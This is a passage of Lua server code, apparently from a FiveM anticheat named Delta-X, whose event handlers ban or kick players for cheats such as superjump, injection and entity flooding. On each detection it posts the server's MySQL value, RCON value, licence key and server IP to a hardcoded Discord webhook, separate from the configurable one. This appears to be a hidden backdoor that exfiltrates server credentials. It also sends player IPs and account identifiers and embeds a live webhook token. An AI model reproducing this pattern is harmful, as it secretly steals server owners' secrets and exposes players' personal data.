**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to add blacklist command ]] .. a .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) BLACKLIST COMMAND",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to add blacklist command ]] .. a .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterServerEvent("DeltaAC:superjump")
AddEventHandler("DeltaAC:superjump", function()
  if IsPlayerUsingSuperJump(source) and not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) SuperJump",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use superjump 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) SuperJump",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use superjump 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterServerEvent("DeltaAC:modmneutexture")
AddEventHandler("DeltaAC:modmneutexture", function(a)
  if not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) INJECTION (TEXTURE)",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to inject (texture) ]] .. a .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) INJECTION (TEXTURE)",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to inject (texture) ]] .. a .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterServerEvent("DeltaAC:nui")
AddEventHandler("DeltaAC:nui", function()
  if DELTAXC.AntiNuiDevToolskick then
    if not doesPlayerHavePerms(source, DELTAX.Bypass) then
      if ExtractIdentifiers(source).discord == "" then
        _discord = "N/A"
      else
        _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
      end
      if ExtractIdentifiers(source).license == "" then
        _license = "N/A"
      else
        _license = ExtractIdentifiers(source).license
      end
      if ExtractIdentifiers(source).xbl == "" then
        _xbl = "N/A"
      else
        _xbl = ExtractIdentifiers(source).xbl
      end
      if ExtractIdentifiers(source).steam == "" then
        _steam = "N/A"
      else
        _steam = ExtractIdentifiers(source).steam
      end
      if ExtractIdentifiers(source).live == "" then
        _live = "N/A"
      else
        _live = ExtractIdentifiers(source).live
      end
      if _steam == "N/A" then
        _steamweb = "N/A"
      else
        _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
      end
      PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Kick) NUI-DEVTOOLS",
            description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use NUI-Devtools 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Kick) NUI-DEVTOOLS",
            description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use NUI-Devtools 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      DropPlayer(source, "[DELTA-X] Dont use NUI-Devtools!")
    end
  elseif not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) NUI-DEVTOOLS",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use NUI-Devtools 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) NUI-DEVTOOLS",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use NUI-Devtools 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterCommand("deltareload", function(a, b, c)
  if a == 0 then
    va = {}
    LoadBany()
    print("[Delta-X] reloaded bans")
  end
end, false)
Citizen.CreateThread(function()
  vehiclesSpawned = {}
  pedsSpawned = {}
  while true do
    Citizen.Wait(DELTAX.NukeResetTime)
    vehiclesSpawned = {}
    pedsSpawned = {}
  end
end)
Citizen.CreateThread(function()
  particlesSpawned = {}
  while true do
    Citizen.Wait(DELTAX.ParticelResetTime)
    particlesSpawned = {}
  end
end)
AddEventHandler("entityCreating", function(a)
  if DELTAX.AntiNuke and DoesEntityExist(a) then
    if NetworkGetEntityOwner(a) == nil then
      CancelEvent()
    end
    if GetEntityType(a) == 2 then
      if GetEntityPopulationType(a) ~= 6 then
      end
      if GetEntityPopulationType(a) == 7 then
        vehiclesSpawned[NetworkGetEntityOwner(a)] = (vehiclesSpawned[NetworkGetEntityOwner(a)] or 0) + 1
        if vehiclesSpawned[NetworkGetEntityOwner(a)] > DELTAX.MaxVehicles and not doesPlayerHavePerms(NetworkGetEntityOwner(a), DELTAX.Bypass) then
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).discord == "" then
            _discord = "N/A"
          else
            _discord = ExtractIdentifiers((NetworkGetEntityOwner(a))).discord:gsub("discord:", "")
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).license == "" then
            _license = "N/A"
          else
            _license = ExtractIdentifiers((NetworkGetEntityOwner(a))).license
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).xbl == "" then
            _xbl = "N/A"
          else
            _xbl = ExtractIdentifiers((NetworkGetEntityOwner(a))).xbl
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).steam == "" then
            _steam = "N/A"
          else
            _steam = ExtractIdentifiers((NetworkGetEntityOwner(a))).steam
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).live == "" then
            _live = "N/A"
          else
            _live = ExtractIdentifiers((NetworkGetEntityOwner(a))).live
          end
          if _steam == "N/A" then
            _steamweb = "N/A"
          else
            _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
          end
          TriggerClientEvent("ZRQA3nmMqUBOIiKwH4I5:clearvehicles", NetworkGetEntityOwner(a), (NetworkGetEntityOwner(a)))
          PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
          end, "POST", json.encode({
            embeds = {
              {
                author = {
                  name = "Delta-X - Anticheat",
                  url = "https://discord.gg/6S4kUkxtMf",
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                title = "(Ban) ANTI-NUKE",
                description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName((NetworkGetEntityOwner(a))) .. [[

**Server-ID:** ]] .. NetworkGetEntityOwner(a) .. [[

**Violation**: tried to nuke the server with ]] .. vehiclesSpawned[NetworkGetEntityOwner(a)] .. [[
 vehicles 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers((NetworkGetEntityOwner(a))).ip:gsub("ip:", "") .. "||",
                footer = {
                  text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                color = 16711680
              }
            }
          }), {
            ["Content-Type"] = "application/json"
          })
          PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
          end, "POST", json.encode({
            embeds = {
              {
                author = {
                  name = "Delta-X - Anticheat",
                  url = "https://discord.gg/6S4kUkxtMf",
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                title = "(Ban) ANTI-NUKE",
                description = [[


**Player:** ]] .. GetPlayerName((NetworkGetEntityOwner(a))) .. [[

**Server-ID:** ]] .. NetworkGetEntityOwner(a) .. [[

**Violation**: tried to nuke the server with ]] .. vehiclesSpawned[NetworkGetEntityOwner(a)] .. [[
 vehicles 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers((NetworkGetEntityOwner(a))).ip:gsub("ip:", "") .. "||",
                footer = {
                  text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                color = 16711680
              }
            }
          }), {
            ["Content-Type"] = "application/json"
          })
          DeltaXBan((NetworkGetEntityOwner(a)))
          CancelEvent()
        end
      end
    elseif GetEntityType(a) == 1 then
      if GetEntityPopulationType(a) ~= 6 then
      end
      if GetEntityPopulationType(a) == 7 then
        pedsSpawned[NetworkGetEntityOwner(a)] = (pedsSpawned[NetworkGetEntityOwner(a)] or 0) + 1
        if pedsSpawned[NetworkGetEntityOwner(a)] > DELTAX.MaxPeds and not doesPlayerHavePerms(NetworkGetEntityOwner(a), DELTAX.Bypass) then
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).discord == "" then
            _discord = "N/A"
          else
            _discord = ExtractIdentifiers((NetworkGetEntityOwner(a))).discord:gsub("discord:", "")
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).license == "" then
            _license = "N/A"
          else
            _license = ExtractIdentifiers((NetworkGetEntityOwner(a))).license
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).xbl == "" then
            _xbl = "N/A"
          else
            _xbl = ExtractIdentifiers((NetworkGetEntityOwner(a))).xbl
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).steam == "" then
            _steam = "N/A"
          else
            _steam = ExtractIdentifiers((NetworkGetEntityOwner(a))).steam
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).live == "" then
            _live = "N/A"
          else
            _live = ExtractIdentifiers((NetworkGetEntityOwner(a))).live
          end
          if _steam == "N/A" then
            _steamweb = "N/A"
          else
            _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
          end
          PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
          end, "POST", json.encode({
            embeds = {
              {
                author = {
                  name = "Delta-X - Anticheat",
                  url = "https://discord.gg/6S4kUkxtMf",
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                title = "(Ban) ANTI-NUKE",
                description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName((NetworkGetEntityOwner(a))) .. [[

**Server-ID:** ]] .. NetworkGetEntityOwner(a) .. [[

**Violation**: tried to nuke the server with ]] .. pedsSpawned[NetworkGetEntityOwner(a)] .. [[
 peds 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers((NetworkGetEntityOwner(a))).ip:gsub("ip:", "") .. "||",
                footer = {
                  text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                color = 16711680
              }
            }
          }), {
            ["Content-Type"] = "application/json"
          })
          PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
          end, "POST", json.encode({
            embeds = {
              {
                author = {
                  name = "Delta-X - Anticheat",
                  url = "https://discord.gg/6S4kUkxtMf",
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                title = "(Ban) ANTI-NUKE",
                description = [[


**Player:** ]] .. GetPlayerName((NetworkGetEntityOwner(a))) .. [[

**Server-ID:** ]] .. NetworkGetEntityOwner(a) .. [[

**Violation**: tried to nuke the server with ]] .. pedsSpawned[NetworkGetEntityOwner(a)] .. [[
 peds 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers((NetworkGetEntityOwner(a))).ip:gsub("ip:", "") .. "||",
                footer = {
                  text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                color = 16711680
              }
            }
          }), {
            ["Content-Type"] = "application/json"
          })
          DeltaXBan((NetworkGetEntityOwner(a)))
          TriggerClientEvent("ZRQA3nmMqUBOIiKwH4I5:clearpeds", -1)
        end
      end
    end
  end
end)
if DELTAX.AntiParticles then
  AddEventHandler("ptFxEvent", function(a, b)
    particlesSpawned[a] = (particlesSpawned[a] or 0) + 1
    if particlesSpawned[a] > DELTAX.MaxParticles and not doesPlayerHavePerms(a, DELTAX.Bypass) then
      if ExtractIdentifiers(a).discord == "" then
        _discord = "N/A"
      else
        _discord = ExtractIdentifiers(a).discord:gsub("discord:", "")
      end
      if ExtractIdentifiers(a).license == "" then
        _license = "N/A"
      else
        _license = ExtractIdentifiers(a).license
      end
      if ExtractIdentifiers(a).xbl == "" then
        _xbl = "N/A"
      else
        _xbl = ExtractIdentifiers(a).xbl
      end
      if ExtractIdentifiers(a).steam == "" then
        _steam = "N/A"
      else
        _steam = ExtractIdentifiers(a).steam
      end
      if ExtractIdentifiers(a).live == "" then
        _live = "N/A"
      else
        _live = ExtractIdentifiers(a).live
      end
      if _steam == "N/A" then
        _steamweb = "N/A"
      else
        _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
      end
      PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) ANTI-PARTICLES",
            description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: tried to nuke the server with ]] .. particlesSpawned[a] .. [[
 particles 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
